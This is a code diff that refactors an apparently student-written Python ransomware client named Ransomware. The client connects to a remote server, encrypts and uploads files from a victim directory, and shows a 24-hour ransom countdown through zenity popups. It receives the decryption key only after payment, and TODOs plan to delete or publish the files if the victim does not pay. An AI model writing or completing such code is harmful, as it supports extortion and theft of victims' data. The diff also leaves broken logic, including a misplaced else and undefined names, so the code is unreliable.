@@ -16,7 +16,7 @@ class Ransomware:
     ENCODING = "utf-8"
     MAX_SIZE = 1024
 
-    def __init__(self, host1, host2, number):
+    def __init__(self, host1, host2, number, directory):
         # Construct hostname of the remote server from the first two
         # arguments.
         self._host = self.SERVER_IP
@@ -24,6 +24,8 @@ class Ransomware:
         self._port = self.decode_port(number)
         # Initialize socket for the connection.
         self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Initialize the root directory on the victim's machine
+        self._directory = directory 
 
     @property
     def host(self):
@@ -151,8 +153,8 @@ class Ransomware:
         
         self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))
 
-                # Encrypt file
-                self.encrypt_file(file_path, key)
+        # Encrypt file
+        self.encrypt_file(file_path, key)
 
         print("Number of files encrypted: " + str(number_of_files))
         print("Total size of files: " + str(size_of_files))
@@ -195,40 +197,26 @@ class Ransomware:
         """ Closing the file. """
         file.close()
 
-
-#Main function/ control flow
-if __name__ == '__main__':
-
-    # Home directory
-    HOME = expanduser("~")
-
-    logging.basicConfig(level=logging.DEBUG)
-
-    # Initialize dropper application.
-    ransomware = Ransomware('tsoh', 'lacol', 729000000)
-    # Receives public key and begins to send files to the server.
-    ransomware.execute_attack()
-
-    #TODO: Replace this with Asymetric crypto
-    #Generate key and make a key file
-    #generate_key()
-    # VICTIM DOESN'T GENERATE THE KEY PAIR! This key file should be sent to them from the server when Implant.py is run
-    with open("key.key", "rb") as key:
-        key = key.read()
+        #TODO: Replace this with Asymetric crypto
+        #Generate key and make a key file
+        #generate_key()
+        # VICTIM DOESN'T GENERATE THE KEY PAIR! This key file should be sent to them from the server when Implant.py is run
+        with open("key.key", "rb") as key:
+            key = key.read()
 
 
-    #Encrypt all files
-    # t1 = threading.Thread(target=ransomware.encrypt_and_send_all_files(), args=(home, key))
-    # t1.start()
+        #Encrypt all files
+        # t1 = threading.Thread(target=self.encrypt_and_send_all_files(), args=(self._directory, key))
+        # t1.start()
 
 
-    #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
-    # again its still the same. Alternatively mayb we tell them not to close their computer?
+        #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
+        # again its still the same. Alternatively mayb we tell them not to close their computer?
 
-    start_time = time.time()
-    remaining_time = 86400
+        start_time = time.time()
+        remaining_time = 86400
 
-    while remaining_time > 0:
+        while remaining_time > 0:
             # Format the remaining time as hours, minutes and seconds
             hours = int(remaining_time // 3600)
             minutes = int((remaining_time%3600) // 60)
@@ -246,37 +234,53 @@ if __name__ == '__main__':
             time.sleep(1)
             popup.send_signal(signal.SIGTERM)
 
-            if (ransomware.check_if_user_has_paid()):
+            if (self.check_if_user_has_paid()):
                 break
 
 
-    #User has paid before the time ran out
-    if (ransomware.check_if_user_has_paid()):
-        t1.join()
-        popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
+        #User has paid before the time ran out
+        if (ransomware.check_if_user_has_paid()):
+            # Waits until all the files has been uploaded before processing the payment
+            #t1.join()
+            popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
         
-        """ Receiving the private key. """
-        filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-        print(f"[RECV] Receiving the private key.")
-        key = open(filename, "w")
-        self._socket.sendall("Private key filename received.".encode("utf-8"))
+            """ Receiving the private key. """
+            filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+            print(f"[RECV] Receiving the private key.")
+            key = open(filename, "w")
+            self._socket.sendall("Private key filename received.".encode("utf-8"))
  
-        """ Receiving the private key from the server. """
-        data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-        key.write(data)
+            """ Receiving the private key from the server. """
+            data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+            key.write(data)
           
-        print(f"[RECV] Receiving the private key data.")
-        key.write(data)
-        self._socket.sendall("File data received".encode("utf-8"))
+            print(f"[RECV] Receiving the private key data.")
+            key.write(data)
+            self._socket.sendall("File data received".encode("utf-8"))
         
-        # decrypt_all_files(home, key)
+            # decrypt_all_files(home, key)
         
-        """ Closing the file. """
-        key.close()
+            """ Closing the file. """
+            key.close()
         
-        #TODO: Implement code to delete all the files that are stored on the server
+            #TODO: Implement code to delete all the files that are stored on the server
 
-    else: # Timer has run out
-        #TODO: Implement file deletion and internet publication code.
-        print('huh')
+            else: # Timer has run out
+                #TODO: Implement file deletion and internet publication code.
+                print('huh')
+
+
+
+#Main function/ control flow
+if __name__ == '__main__':
+
+    # Home directory
+    HOME = expanduser("~")
+
+    logging.basicConfig(level=logging.DEBUG)
+
+    # Initialize dropper application.
+    ransomware = Ransomware('tsoh', 'lacol', 729000000, directory)
+    # Receives public key and begins to send files to the server.
+    ransomware.execute_attack()
 
